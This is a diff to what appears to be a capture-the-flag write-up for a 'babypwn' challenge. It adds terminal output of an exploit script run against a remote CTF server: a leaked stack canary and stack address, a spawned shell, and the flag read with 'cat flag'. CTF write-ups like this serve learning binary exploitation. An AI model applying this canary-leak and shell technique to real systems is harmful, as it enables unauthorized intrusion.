@@ -97,3 +97,24 @@ c.shell()
 
 {% endhighlight %}
 
+{% highlight sh %}
+
+$ python exp.py r
+[*]Connecting "110.10.212.130:8889"...
+[+]Connection success!
+[+]canary: 0xcc781900
+[+]stack_addr: 0xffca6f34
+*** 4ll y0u n33d i5 5HELL! ***
+
+
+Time Out!
+ls
+babypwn
+flag
+
+cat flag
+FLAG{Good_Job~!Y0u_@re_Very__G@@d!!!!!!^.^}
+exit
+*** Connection closed by remote host ***
+
+{% endhighlight %}
